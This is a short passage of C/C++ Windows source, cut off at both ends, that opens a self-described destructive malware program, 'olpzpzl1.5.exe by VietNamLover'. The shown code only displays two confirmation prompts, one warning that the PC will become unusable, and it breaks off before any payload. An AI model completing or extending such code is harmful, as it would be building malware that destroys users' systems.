...
{
	if (MessageBoxW(NULL, L"do you want to execute this malware?", L"olpzpzl1.5.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"IF YOU RUN THIS MALWARE, YOUR PC WILL BE UNUSEABLE! STILL EXECUTER THIS DESTRUCTIVE MALWARE?!", L"olpzpzl1.5.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
